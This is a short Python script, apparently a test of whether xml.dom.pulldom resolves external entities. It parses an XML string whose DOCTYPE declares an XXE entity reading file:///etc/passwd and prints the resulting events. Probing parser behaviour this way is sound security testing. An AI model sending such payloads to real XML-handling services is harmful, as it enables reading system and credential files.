#!/usr/bin/env python3
# coding: UTF-8

import xml.dom.pulldom as pulldom

data = '''\
<!DOCTYPE data [
<!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data>
    &secret;
</data>
'''

doc = pulldom.parseString(data)
for event, node in doc:
    print(event, node)
